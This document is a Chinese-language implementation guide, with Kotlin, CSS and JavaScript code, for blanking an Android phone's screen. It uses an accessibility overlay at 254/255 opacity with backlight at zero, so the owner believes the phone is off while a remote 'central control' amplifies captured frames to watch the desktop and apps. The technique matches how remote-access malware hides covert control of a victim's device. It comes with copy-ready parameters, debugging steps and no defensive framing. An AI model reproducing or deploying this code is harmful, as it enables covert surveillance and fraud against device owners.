# 手机黑屏 + 后台半透明（核心实现）

## 效果

```
用户看手机：全黑（像息屏 / 像没开）
中控（后台）看这台设备：半透明 —— 能透出桌面和 App 内容
```

原理只有一句话：**遮罩用 254/255 而不是 255**。
留下 1 个色阶的透光，人眼看不见，但抓到的画面里还残留桌面信息；中控把这 1 个色阶放大回来，就成了“半透明”。

---

## 一、手机端：铺一层 0xFE000000

```kotlin
// 关键值：0xFE = 254，不是 0xFF = 255
private const val MASK_ALPHA = 254f / 255f      // ≈ 0.9961，留 1/255 透光

fun showBlack(service: AccessibilityService) {
    if (android.os.Looper.myLooper() != android.os.Looper.getMainLooper()) {
        android.os.Handler(android.os.Looper.getMainLooper()).post { showBlack(service) }
        return
    }

    val wm = service.getSystemService(android.content.Context.WINDOW_SERVICE) as android.view.WindowManager

    val lp = android.view.WindowManager.LayoutParams(
        android.view.WindowManager.LayoutParams.MATCH_PARENT,
        android.view.WindowManager.LayoutParams.MATCH_PARENT,
        2032,   // TYPE_ACCESSIBILITY_OVERLAY：无障碍浮层，不需要悬浮窗权限，按 HOME 也不会消失
        android.view.WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
        android.view.WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or
        android.view.WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON,
        android.graphics.PixelFormat.TRANSLUCENT      // 允许半透明
    ).apply {
        gravity = android.view.Gravity.TOP or android.view.Gravity.START
        screenBrightness = 0f                          // 背光压到底：人眼是真黑
    }

    val a = (MASK_ALPHA * 255).toInt()                  // = 254
    val view = android.view.View(service).apply {
        setBackgroundColor(a shl 24)                    // ARGB 只给 A，RGB=0 → 0xFE000000
    }
    wm.addView(view, lp)
}

fun hideBlack(service: AccessibilityService, view: android.view.View) {
    val wm = service.getSystemService(android.content.Context.WINDOW_SERVICE) as android.view.WindowManager
    runCatching { wm.removeView(view) }
}
```

> 就这一段是核心。`254` 换成 `255` 就变成"真·全黑"，中控再怎么提亮也是纯黑。

---

## 二、中控端：把那 1 个色阶放大

收到的画面亮度被压到了原来的 1/255，中控侧放大即可（推荐 40 倍左右）：

```css
/* 简单做法：直接对播放画面加滤镜 */
.device-screen video,
.device-screen img {
  filter: brightness(40) contrast(1.1) saturate(1.05);
}
```

要更干净就逐像素处理：

```js
// canvas 逐像素：×K 后截断到 255
function lift(srcCanvas, dstCanvas, K = 40) {
  const s = srcCanvas.getContext('2d').getImageData(0, 0, srcCanvas.width, srcCanvas.height);
  const d = dstCanvas.getContext('2d').createImageData(s.width, s.height);
  for (let i = 0; i < s.data.length; i += 4) {
    d.data[i]     = Math.min(255, s.data[i]     * K);
    d.data[i + 1] = Math.min(255, s.data[i + 1] * K);
    d.data[i + 2] = Math.min(255, s.data[i + 2] * K);
    d.data[i + 3] = 255;
  }
  dstCanvas.getContext('2d').putImageData(d, 0, 0);
}
```

---

## 三、参数对照（照抄即可）

| 参数 | 值 | 作用 |
|---|---|---|
| 遮罩颜色 | `0xFE000000`（254/255） | 人眼黑、帧里留桌面 |
| 窗口类型 | `2032` TYPE_ACCESSIBILITY_OVERLAY | 免悬浮窗权限、按 HOME 不消失 |
| PixelFormat | `TRANSLUCENT` | 允许半透明合成 |
| `screenBrightness` | `0f` | 背光到 0，人眼确认真黑 |
| flags | `NOT_FOCUSABLE \| NOT_TOUCHABLE \| KEEP_SCREEN_ON` | 不抢焦点 / 触摸穿透 / 不振屏 |
| 中控提亮 | `brightness(40)` 或像素 ×40 | 还原桌面，得到“半透明”观感 |

---

## 四、调试顺序（3 步能看出效果）

```
1. 只加遮罩：手机全黑，中控看到的也是黑 → 说明 254 生效（没有桌面信息就说明写成了 255）
2. 中控加 brightness(40)：中控开始能看见桌面/App，手机端仍是黑 → 成功
3. 微调倍数：40 太暗就 60~80；出现雪花噪点就降到 25~30
```

## 五、两个必须注意的点

```
① 遮罩必须是 254，不能 255 —— 255 会把桌面信息压成 0，提亮后只有纯黑
② 一定要 FLAG_KEEP_SCREEN_ON —— 一旦息屏，屏幕真的黑了，抓帧什么都没有
```
